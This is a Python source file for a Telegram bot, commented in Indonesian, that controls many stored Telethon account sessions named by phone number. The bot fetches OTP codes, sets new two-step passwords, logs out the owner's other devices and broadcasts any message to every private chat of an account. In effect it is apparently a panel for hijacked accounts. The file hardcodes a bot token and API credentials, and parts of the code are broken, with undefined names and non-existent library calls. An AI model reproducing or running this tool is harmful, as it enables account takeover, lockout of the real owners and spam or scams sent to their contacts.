import asyncio
import hashlib
import os
import types
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from get_otp import get_otp_handler
from sesi_aktif import sesi_aktif_handler
from data_kontak import data_kontak_handler
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.types import User
import pytz
from datetime import datetime
import time
from set_password_handler import set_password_callback
from logout_device import logout_other_devices
from configparser import ConfigParser

# Konfigurasi bot
API_ID = 23520639
API_HASH = 'bcbc7a22cde8fa2ba7d1baad086086ca'
BOT_TOKEN = '8033198485:AAG5-a8uZ3AhjRNNIUqmR4VkePTQd7j7ibA'
SESSION_FOLDER = os.path.join(os.path.dirname(__file__), '..', 'cek')
SESSION_FOLDER = os.path.abspath(SESSION_FOLDER)
os.makedirs(SESSION_FOLDER, exist_ok=True)

# Fungsi ambil session
def get_registered_sessions():
    sessions = [f.replace('.session', '') for f in os.listdir(SESSION_FOLDER) if f.endswith('.session')]
    return sorted(sessions)

# Kirim daftar nomor dengan tombol
async def send_session_list(update: Update, context: ContextTypes.DEFAULT_TYPE, page: int = 0):
    sessions = get_registered_sessions()
    per_page = 10
    start = page * per_page
    end = start + per_page
    current_page_sessions = sessions[start:end]

    keyboard = [[InlineKeyboardButton(num, callback_data=f"select_{num}")] for num in current_page_sessions]

    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Back", callback_data=f"page_{page-1}"))
    if end < len(sessions):
        nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"page_{page+1}"))
    if nav_buttons:
        keyboard.append(nav_buttons)

    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text("📱 Pilih nomor:", reply_markup=reply_markup)
    else:
        await update.message.reply_text("📱 Pilih nomor:", reply_markup=reply_markup)

# Command /user
async def user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_session_list(update, context, 0)

# Tampilkan info akun + tombol aksi
async def handle_select_number(update, context, phone_number):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")

    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(f"❌ Session tidak ditemukan untuk {phone_number}")
        return

    try:
        # Buat client sementara
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.start()
        me = await client.get_me()
        await client.disconnect()

        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or 'Tidak ada nama lengkap'
        username = me.username or 'Tidak ada username'
        bio = me.bot and 'Bot Telegram' or (me.phone or 'Tidak ada bio')
        location = me.lang_code.upper() if me.lang_code else 'Tidak diketahui'

        # Waktu lokal
        from datetime import datetime
        import pytz
        local_time = datetime.now(pytz.timezone('Asia/Jakarta')).strftime('%Y-%m-%d %H:%M:%S')

        info = f"👤 *Info Akun*\n\n"
        info += f"🔹 *Nama*: {full_name}\n"
        info += f"🔹 *Username*: @{username}\n"
        info += f"🔹 *Bio*: {bio}\n"
        info += f"🔹 *Lokasi*: {location}\n"
        info += f"🕒 *Waktu*: {local_time} WIB\n\n"
        info += f"📱 Nomor: `{phone_number}`\n\nPilih aksi di bawah:"

    except Exception as e:
        info = f"⚠️ Gagal mengambil info akun `{phone_number}`:\n`{e}`"
        reply_markup = None
        await update.callback_query.message.reply_text(info, parse_mode='Markdown')
        return

    # Tombol aksi
    keyboard = [
        [
            InlineKeyboardButton("🔐 GET OTP", callback_data=f"getotp_{phone_number}"),
            InlineKeyboardButton("🟢 SESI AKTIF", callback_data=f"sesi_{phone_number}")
        ],
        [
            InlineKeyboardButton("🔒 SET PASSWORD", callback_data=f"set_password_{phone_number}"),
            InlineKeyboardButton("📇BROADCAST", callback_data=f"kontak_{phone_number}")
        ],
        [
            InlineKeyboardButton("❌LOGOUT DEVICE", callback_data=f"logout_{phone_number}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.message.reply_text(info, parse_mode='Markdown', reply_markup=reply_markup)


# Fungsi untuk broadcast pesan ke kontak yang dimiliki oleh session
async def broadcast_to_contacts_handler(update, context, phone_number, message_to_broadcast):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")

    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(f"❌ Session tidak ditemukan untuk {phone_number}")
        return

    try:
        # Buat client sementara
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.start()

        # Kirim pesan "sedang broadcast"
        keyboard = [
            [InlineKeyboardButton("🛑 Stop Broadcast", callback_data="stop_broadcast")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        broadcast_message = await update.callback_query.message.reply_text("⏳ Sedang broadcast, harap menunggu...", reply_markup=reply_markup)

        # Ambil daftar percakapan (termasuk kontak) menggunakan client.get_dialogs()
        try:
            dialogs = await client.get_dialogs()
        except Exception as e:
            await update.callback_query.message.reply_text(f"⚠️ Gagal mengambil percakapan: {e}")
            await client.disconnect()
            return

        # Kirim pesan ke setiap kontak
        sent_count = 0
        for dialog in dialogs:
            if isinstance(dialog.entity, User):  # Pastikan itu kontak
                try:
                    # Kirim pesan ke kontak
                    await client.send_message(dialog.entity.id, message_to_broadcast)
                    sent_count += 1
                    # Tambahkan jeda agar tidak terkena rate limit
                    time.sleep(1)  # Sesuaikan dengan kebutuhan, misalnya 1 detik
                except Exception as e:
                    print(f"⚠️ Gagal mengirim ke kontak {dialog.entity.username or dialog.entity.id}: {e}")

        await client.disconnect()

        # Hapus pesan "sedang broadcast" dan tampilkan hasil
        await broadcast_message.delete()
        if sent_count > 0:
            await update.callback_query.message.reply_text(f"✅ Pesan berhasil disebarkan ke {sent_count} kontak.")
        else:
            await update.callback_query.message.reply_text("⚠️ Tidak ada kontak yang dapat diakses atau pesan gagal dikirim.")

    except Exception as e:
        await update.callback_query.message.reply_text(f"⚠️ Terjadi kesalahan: {e}")


async def handle_logout_device(update, context, phone_number):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")

    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(f"❌ Session tidak ditemukan untuk {phone_number}")
        return

    try:
        await logout_other_devices(session_path)
        await update.callback_query.message.reply_text(f"🔴 Semua perangkat selain perangkat utama telah logout.")

    except Exception as e:
        await update.callback_query.message.reply_text(f"⚠️ Gagal logout perangkat: {e}")


# Fungsi untuk menghentikan broadcast
async def stop_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.message.reply_text("❌ Broadcast dihentikan.")
    # Dapatkan context dan lakukan pembatalan broadcast jika diperlukan

async def set_password(update, context, session_path):
    try:
        if not os.path.exists(session_path):
            await update.callback_query.edit_message_text("❌ Session tidak ditemukan.")
            return

        await update.callback_query.edit_message_text("🛡 Silakan kirim password baru ke bot ini (dalam 60 detik)...")

        def check(msg):
            return msg.chat.id == update.callback_query.message.chat.id and msg.text

        # Tunggu user kirim password baru via message
        from telegram.ext import filters  # pastikan filters dipakai kalau perlu
        password_message = await context.bot.wait_for_message(chat_id=update.effective_chat.id, timeout=60)
        if not password_message:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="⏱️ Tidak ada password masuk. Ulangi prosesnya.")
            return

        password_baru = password_message.text.strip()

        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Session belum login.")
            await client.disconnect()
            return

        # Ambil info password saat ini
        pwd_info = await client(function.account.GetPasswordRequest())

        # Hash password baru
        password_bytes = password_baru.encode("utf-8")
        pwd_hash = hashlib.pbkdf2_hmac("sha512", password_bytes, pwd_info.salt, 100000)

        # Update password
        await client(function.account.UpdatePasswordSettingsRequest(
            current_password=pwd_info,
            new_settings=types.account.PasswordInputSettings(
                password_hash=pwd_hash,
                hint="Password Baru"
            )
        ))

        await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Password berhasil diubah.")
        await client.disconnect()

    except asyncio.TimeoutError:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⏱️ Waktu habis. Silakan ulangi proses.")
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Gagal mengubah password.\n{str(e)}")

# Handler utama tombol
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data
    if data.startswith("page_"):
        page = int(data.split("_")[1])
        await send_session_list(update, context, page)

    elif data.startswith("select_"):
        phone_number = data.split("_", 1)[1]
        await handle_select_number(update, context, phone_number)

    elif data.startswith("getotp_"):
        phone_number = data.split("_", 1)[1]
        await get_otp_handler(update, context, phone_number)

    # Lanjutan dari button_handler
    elif data.startswith("sesi_"):
        phone_number = data.split("_", 1)[1]
        await sesi_aktif_handler(update, context, phone_number)

    elif data.startswith("kontak_"):
        phone_number = data.split("_", 1)[1]
        await update.callback_query.message.reply_text("📝 Silakan kirim pesan yang ingin dibroadcast ke kontak.")

        def check(msg):
            return msg.chat.id == update.effective_chat.id and msg.text

        try:
            message = await context.bot.wait_for_message(chat_id=update.effective_chat.id, timeout=120)
            if message:
                await broadcast_to_contacts_handler(update, context, phone_number, message.text)
            else:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Tidak ada pesan yang dikirim.")
        except asyncio.TimeoutError:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="⏱️ Waktu habis. Silakan ulangi proses.")

    elif data.startswith("set_password_"):
        phone_number = data.split("_", 1)[1]
        await set_password_callback(update, context)

    elif data.startswith("logout_"):
        phone_number = data.split("_", 1)[1]
        await handle_logout_device(update, context, phone_number)

    elif data == "stop_broadcast":
        await stop_broadcast(update, context)

# Fungsi utama untuk menjalankan bot
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # ✅ Load API ID dan HASH dari config / environment / hardcoded
    api_id = 23520639  # ganti dengan API ID kamu
    api_hash = "bcbc7a22cde8fa2ba7d1baad086086ca"  # ganti dengan API Hash kamu

    # Simpan ke context.bot_data
    application.bot_data['api_id'] = api_id
    application.bot_data['api_hash'] = api_hash

    application.add_handler(CommandHandler("user", user_command))
    application.add_handler(CallbackQueryHandler(button_handler))

    print("✅ Bot aktif dan berjalan...")
    application.run_polling()

if __name__ == "__main__":
    main()

